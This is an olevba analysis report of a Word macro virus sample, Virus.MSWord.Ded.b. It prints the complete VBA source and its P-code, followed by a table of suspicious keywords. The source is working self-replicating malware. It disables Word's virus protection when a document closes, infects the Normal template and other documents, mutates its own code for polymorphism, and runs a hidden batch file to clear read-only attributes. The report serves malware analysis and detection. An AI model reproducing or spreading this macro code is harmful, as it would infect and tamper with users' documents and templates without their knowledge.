olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ded.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ded.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub Document_Close()
'26,37929
  On Error _
GoTo skam

 _
Options.VirusProtection = unimplemented

     SWL
'4,564917
    ABS99
'16,04415
skam:
'32,62062
 _
 End Sub

 _
     Private Sub SWL()

 _
      If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

   d = NormalTemplate. _
VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
   If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
     While Mid(d, Len(d) - 1, 2) = " _"

  i = i + 1
'7,395333
 _
           d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

          Wend
'19,19225
 _
  d = e(d)

 _
      ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
  End If

  Next _
i

 _
  ActiveDocument.SaveAs AddToRecentFiles:=False

 _
   End If

 _
   End Sub

 _
  Private Sub ABS99()

         If Not NormalTemplate.VBProject. _
VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

      f _
(NormalTemplate.FullName)

     For i _
= 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
            d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
  If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
       While Mid(d, Len(d) - 1, 2) = " _"

        i _
= i + 1

         d = _
Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
         Wend

 _
d = e(d)

 _
     NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
    End If

 _
      Next i

 _
    NormalTemplate.Save

                End If
'43,27595
 _
     End Sub

 _
               Private Function e(aString) As String

 _
  For i = 1 To Len(aString) - 1

 _
While Mid(aString, i, 2) = " "

 _
        aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)

              Wend
'32,6144
 _
 If Mid(aString, i, 1) = "." Then

  If Not _
Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
 If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 e = _
Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
    For J = 1 To Int(15 * Rnd)

 _
          e = " " & e

 _
         Next J

 _
            Exit Function

 _
      End If

   End _
If

 _
    Else

 _
      If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

 _
If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

                e _
= Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

       For _
J = 1 To Int(15 * Rnd)

 _
e = " " & e

 _
   Next J

            Exit Function
'49,20062
 _
     End If

 _
        End If

 _
          End If

 _
          Next i

            e = aString _
& Chr$(13) & "'" & (100 * Rnd)

              Count = _
Int(15 * Rnd)

For _
J = 1 To Count

 e = " " & e
'69,46075
          Next J
'30,96175
 _
       End Function

 _
           Private Sub f(fName)

 _
     If GetAttr(fName) And vbReadOnly Then

 _
    Open Dir(fName) & ".bat" For Append As #1

Print #1, "Attrib " & "-r " & Chr$(34) _
& fName & Chr$(34)

             Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)
'95,04134
 _
 Close #1

 _
shellResult = Shell(Dir(fName) & ".bat", vbHide)

 _
            End If

       End _
Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ded.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8029 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0008 "26,37929"
' Line #2:
' 	LineCont 0x0004 02 00 00 00
' 	OnError skam 
' Line #3:
' Line #4:
' 	LineCont 0x0004 00 00 00 00
' 	Ld unimplemented 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	ArgsCall SWL 0x0000 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "4,564917"
' Line #8:
' 	ArgsCall ABS99 0x0000 
' Line #9:
' 	QuoteRem 0x0000 0x0008 "16,04415"
' Line #10:
' 	Label skam 
' Line #11:
' 	QuoteRem 0x0000 0x0008 "32,62062"
' Line #12:
' 	LineCont 0x0004 00 00 01 00
' 	EndSub 
' Line #13:
' Line #14:
' 	LineCont 0x0004 00 00 05 00
' 	FuncDefn (Private Sub SWL())
' Line #15:
' Line #16:
' 	LineCont 0x0004 00 00 06 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #17:
' Line #18:
' 	LineCont 0x0004 00 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #19:
' Line #20:
' 	LineCont 0x0004 04 00 00 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #21:
' Line #22:
' 	LineCont 0x0004 00 00 03 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #23:
' Line #24:
' 	LineCont 0x0004 00 00 05 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #25:
' Line #26:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #27:
' 	QuoteRem 0x0000 0x0008 "7,395333"
' Line #28:
' 	LineCont 0x0004 00 00 0B 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #29:
' Line #30:
' 	Wend 
' Line #31:
' 	QuoteRem 0x0000 0x0008 "19,19225"
' Line #32:
' 	LineCont 0x0004 00 00 02 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #33:
' Line #34:
' 	LineCont 0x0004 00 00 06 00
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' Line #36:
' 	LineCont 0x0004 00 00 02 00
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' Line #40:
' 	LineCont 0x0004 00 00 02 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #41:
' Line #42:
' 	LineCont 0x0004 00 00 03 00
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	LineCont 0x0004 00 00 03 00
' 	EndSub 
' Line #45:
' Line #46:
' 	LineCont 0x0004 00 00 02 00
' 	FuncDefn (Private Sub ABS99())
' Line #47:
' Line #48:
' 	LineCont 0x0004 06 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #49:
' Line #50:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #51:
' Line #52:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #53:
' Line #54:
' 	LineCont 0x0004 00 00 0C 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #55:
' Line #56:
' 	LineCont 0x0004 00 00 02 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #57:
' Line #58:
' 	LineCont 0x0004 00 00 07 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #59:
' Line #60:
' 	LineCont 0x0004 01 00 00 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #61:
' Line #62:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #63:
' Line #64:
' 	LineCont 0x0004 00 00 09 00
' 	Wend 
' Line #65:
' Line #66:
' 	LineCont 0x0004 00 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #67:
' Line #68:
' 	LineCont 0x0004 00 00 05 00
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #69:
' Line #70:
' 	LineCont 0x0004 00 00 04 00
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	LineCont 0x0004 00 00 06 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' Line #74:
' 	LineCont 0x0004 00 00 04 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #75:
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	QuoteRem 0x0000 0x0008 "43,27595"
' Line #78:
' 	LineCont 0x0004 00 00 05 00
' 	EndSub 
' Line #79:
' Line #80:
' 	LineCont 0x0004 00 00 0F 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #81:
' Line #82:
' 	LineCont 0x0004 00 00 02 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #83:
' Line #84:
' 	LineCont 0x0004 00 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	While 
' Line #85:
' Line #86:
' 	LineCont 0x0004 00 00 08 00
' 	Ld aString 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St aString 
' Line #87:
' Line #88:
' 	Wend 
' Line #89:
' 	QuoteRem 0x0000 0x0007 "32,6144"
' Line #90:
' 	LineCont 0x0004 00 00 01 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #91:
' Line #92:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #93:
' Line #94:
' 	LineCont 0x0004 00 00 01 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #95:
' Line #96:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #97:
' Line #98:
' 	LineCont 0x0004 00 00 04 00
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #99:
' Line #100:
' 	LineCont 0x0004 00 00 0A 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #101:
' Line #102:
' 	LineCont 0x0004 00 00 09 00
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' Line #104:
' 	LineCont 0x0004 00 00 0C 00
' 	ExitFunc 
' Line #105:
' Line #106:
' 	LineCont 0x0004 00 00 06 00
' 	EndIfBlock 
' Line #107:
' Line #108:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	LineCont 0x0004 00 00 04 00
' 	ElseBlock 
' Line #111:
' Line #112:
' 	LineCont 0x0004 00 00 06 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #113:
' Line #114:
' 	LineCont 0x0004 00 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #115:
' Line #116:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #117:
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #119:
' Line #120:
' 	LineCont 0x0004 00 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #121:
' Line #122:
' 	LineCont 0x0004 00 00 03 00
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' Line #124:
' 	ExitFunc 
' Line #125:
' 	QuoteRem 0x0000 0x0008 "49,20062"
' Line #126:
' 	LineCont 0x0004 00 00 05 00
' 	EndIfBlock 
' Line #127:
' Line #128:
' 	LineCont 0x0004 00 00 08 00
' 	EndIfBlock 
' Line #129:
' Line #130:
' 	LineCont 0x0004 00 00 0A 00
' 	EndIfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 00 00 0A 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' Line #134:
' 	LineCont 0x0004 03 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #135:
' Line #136:
' 	LineCont 0x0004 02 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #137:
' Line #138:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #139:
' Line #140:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #141:
' 	QuoteRem 0x0000 0x0008 "69,46075"
' Line #142:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #143:
' 	QuoteRem 0x0000 0x0008 "30,96175"
' Line #144:
' 	LineCont 0x0004 00 00 07 00
' 	EndFunc 
' Line #145:
' Line #146:
' 	LineCont 0x0004 00 00 0B 00
' 	FuncDefn (Private Sub False(fName))
' Line #147:
' Line #148:
' 	LineCont 0x0004 00 00 05 00
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #149:
' Line #150:
' 	LineCont 0x0004 00 00 04 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #151:
' Line #152:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #153:
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #155:
' 	QuoteRem 0x0000 0x0008 "95,04134"
' Line #156:
' 	LineCont 0x0004 00 00 01 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #157:
' Line #158:
' 	LineCont 0x0004 00 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #159:
' Line #160:
' 	LineCont 0x0004 00 00 0C 00
' 	EndIfBlock 
' Line #161:
' Line #162:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #163:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

